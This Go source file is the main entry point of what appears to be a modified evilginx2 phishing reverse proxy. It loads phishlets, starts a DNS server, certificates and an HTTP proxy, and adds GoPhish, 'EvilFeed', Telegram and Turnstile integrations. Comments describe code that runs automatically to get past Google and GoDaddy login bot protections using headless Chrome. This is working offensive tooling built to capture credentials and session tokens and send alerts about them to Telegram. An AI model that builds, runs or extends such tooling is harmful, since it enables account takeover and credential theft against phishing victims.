package main

import (
	"flag"
	"fmt"
	_log "log"
	"os"
	"os/user"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/caddyserver/certmagic"
	"github.com/kgretzky/evilginx2/core"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
	"go.uber.org/zap"

	"github.com/fatih/color"
)

var phishlets_dir = flag.String("p", "", "Phishlets directory path")
var redirectors_dir = flag.String("t", "", "HTML redirector pages directory path")
var debug_log = flag.Bool("debug", false, "Enable debug output")
var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
var cfg_dir = flag.String("c", "", "Configuration directory path")
var version_flag = flag.Bool("v", false, "Show version")
var feed_enabled = flag.Bool("feed", false, "Auto-enable EvilFeed integration on startup")
var gophish_db_path = flag.String("g", "", "Path to GoPhish database file (e.g., /path/to/gophish.db)")
var telegram_config = flag.String("telegram", "", "Auto-enable Telegram notifications with format: <bottoken>:<chatid>")
var turnstile_config = flag.String("turnstile", "", "Auto-enable Turnstile verification with format: <sitekey>:<secretkey>")

func joinPath(base_path string, rel_path string) string {
	var ret string
	if filepath.IsAbs(rel_path) {
		ret = rel_path
	} else {
		ret = filepath.Join(base_path, rel_path)
	}
	return ret
}

func showAd() {
	lred := color.New(color.FgHiRed)
	lyellow := color.New(color.FgHiYellow)
	white := color.New(color.FgHiWhite)
	message := fmt.Sprintf("%s: %s %s", lred.Sprint("Evilginx Mastery Course"), lyellow.Sprint("https://academy.breakdev.org/evilginx-mastery"), white.Sprint("(learn how to create phishlets)"))
	log.Info("%s", message)
}

// NOTE: Google and GoDaddy bypasses are ALWAYS ACTIVE when Chrome is running on port 9222
// Chrome is started automatically by start.sh (start_chrome_headless function)
// No flags needed - the bypass code in http_proxy.go triggers automatically based on URL patterns

func init() {
	flag.Parse()
	// Chrome headless is now started by start.sh script (start_chrome_headless function)
	// This ensures Chrome is available for both GoogleBypasser and KasadaBypasser
	// The bypass code in http_proxy.go will automatically trigger when:
	// - GoogleBypasser: accounts.google.com + specific batchexecute URL
	// - KasadaBypasser: sso.godaddy.com + /v1/api/pass/login
}

func getenv(key, fallback string) string {
	value := os.Getenv(key)
	if value == "" {
		return fallback
	}
	return value
}

func main() {
	flag.Parse()

	if *version_flag == true {
		log.Info("version: %s", core.VERSION)
		return
	}

	exe_path, _ := os.Executable()
	exe_dir := filepath.Dir(exe_path)

	core.Banner()
	showAd()

	_log.SetOutput(log.NullLogger().Writer())
	certmagic.Default.Logger = zap.NewNop()
	certmagic.DefaultACME.Logger = zap.NewNop()

	if *phishlets_dir == "" {
		*phishlets_dir = joinPath(exe_dir, "./phishlets")
		if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
			*phishlets_dir = "/usr/share/evilginx/phishlets/"
			if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
				log.Fatal("you need to provide the path to directory where your phishlets are stored: ./evilginx -p <phishlets_path>")
				return
			}
		}
	}
	if *redirectors_dir == "" {
		*redirectors_dir = joinPath(exe_dir, "./redirectors")
		if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
			*redirectors_dir = "/usr/share/evilginx/redirectors/"
			if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
				*redirectors_dir = joinPath(exe_dir, "./redirectors")
			}
		}
	}
	if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
		log.Fatal("provided phishlets directory path does not exist: %s", *phishlets_dir)
		return
	}
	if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
		os.MkdirAll(*redirectors_dir, os.FileMode(0700))
	}

	log.DebugEnable(*debug_log)
	if *debug_log {
		log.Info("debug output enabled")
	}

	phishlets_path := *phishlets_dir
	log.Info("loading phishlets from: %s", phishlets_path)

	if *cfg_dir == "" {
		usr, err := user.Current()
		if err != nil {
			log.Fatal("%v", err)
			return
		}
		*cfg_dir = filepath.Join(usr.HomeDir, ".evilginx")
	}

	config_path := *cfg_dir
	log.Info("loading configuration from: %s", config_path)

	err := os.MkdirAll(*cfg_dir, os.FileMode(0700))
	if err != nil {
		log.Fatal("%v", err)
		return
	}

	crt_path := joinPath(*cfg_dir, "./crt")

	cfg, err := core.NewConfig(*cfg_dir, "")
	if err != nil {
		log.Fatal("config: %v", err)
		return
	}
	cfg.SetRedirectorsDir(*redirectors_dir)

	db, err := database.NewDatabase(filepath.Join(*cfg_dir, "data.db"))
	if err != nil {
		log.Fatal("database: %v", err)
		return
	}

	bl, err := core.NewBlacklist(filepath.Join(*cfg_dir, "blacklist.txt"))
	if err != nil {
		log.Error("blacklist: %s", err)
		return
	}

	files, err := os.ReadDir(phishlets_path)
	if err != nil {
		log.Fatal("failed to list phishlets directory '%s': %v", phishlets_path, err)
		return
	}
	for _, f := range files {
		if !f.IsDir() {
			pr := regexp.MustCompile(`([a-zA-Z0-9\-\.]*)\.yaml`)
			rpname := pr.FindStringSubmatch(f.Name())
			if rpname == nil || len(rpname) < 2 {
				continue
			}
			pname := rpname[1]
			if pname != "" {
				pl, err := core.NewPhishlet(pname, filepath.Join(phishlets_path, f.Name()), nil, cfg)
				if err != nil {
					log.Error("failed to load phishlet '%s': %v", f.Name(), err)
					continue
				}
				cfg.AddPhishlet(pname, pl)
			}
		}
	}
	cfg.LoadSubPhishlets()
	cfg.CleanUp()

	ns, _ := core.NewNameserver(cfg)
	ns.Start()

	crt_db, err := core.NewCertDb(crt_path, cfg, ns)
	if err != nil {
		log.Fatal("certdb: %v", err)
		return
	}

	// Initialize session logger
	sessionLogger := core.NewSessionLogger(filepath.Join(*cfg_dir, "sessions"))
	_ = sessionLogger // Used by EvilFeed integration

	// Initialize telegram notifier
	telegram := core.NewTelegramNotifier(cfg.GetTelegramConfig(), db)
	_ = telegram // Used by EvilFeed integration

	// ============================================================================
	// REMOVED Chrome pre-warming (was part of complex async implementation)
	// Now using simple synchronous approach with fresh browser per request
	// ============================================================================

	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)

	// Handle CLI flags for integrations
	if *feed_enabled {
		hp.EnableEvilFeedFromCLI()
	}
	if *gophish_db_path != "" {
		// Set GoPhish DB path in config for EvilFeed to use
		cfg.SetGophishDBPath(*gophish_db_path)
		log.Info("GoPhish DB path set via -g flag: %s", *gophish_db_path)
	}
	if *telegram_config != "" {
		// Parse telegram config: <bottoken>:<chatid>
		// Strip outer <> if present and split on >:<
		config := strings.TrimPrefix(*telegram_config, "<")
		config = strings.TrimSuffix(config, ">")
		parts := strings.SplitN(config, ">:<", 2)
		if len(parts) == 2 && parts[0] != "" && parts[1] != "" {
			cfg.SetTelegramBotToken(parts[0])
			cfg.SetTelegramChatId(parts[1])
			cfg.SetTelegramEnabled(true)
			log.Info("Telegram notifications enabled via -telegram flag")
		} else {
			log.Warning("Invalid -telegram format. Expected: <bottoken>:<chatid>")
		}
	}
	if *turnstile_config != "" {
		// Parse turnstile config: <sitekey>:<secretkey>
		// Strip outer <> if present and split on >:<
		config := strings.TrimPrefix(*turnstile_config, "<")
		config = strings.TrimSuffix(config, ">")
		parts := strings.SplitN(config, ">:<", 2)
		if len(parts) == 2 && parts[0] != "" && parts[1] != "" {
			cfg.SetTurnstileSiteKey(parts[0])
			cfg.SetTurnstileSecretKey(parts[1])
			cfg.SetTurnstileEnabled(true)
			log.Info("Turnstile verification enabled via -turnstile flag")
		} else {
			log.Warning("Invalid -turnstile format. Expected: <sitekey>:<secretkey>")
		}
	}

	hp.Start()

	// Start internal HTTP API server for EvilFeed communication (no TLS, localhost only)
	internalAPI := core.NewInternalAPI(cfg, db, hp)
	if err := internalAPI.Start(); err != nil {
		log.Warning("internal API: failed to start: %v (EvilFeed may not work)", err)
	} else {
		log.Info("internal API started on port %d (HTTP, localhost only)", cfg.GetInternalAPIPort())
	}

	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
	if err != nil {
		log.Fatal("%v", err)
		return
	}

	t.DoWork()
}
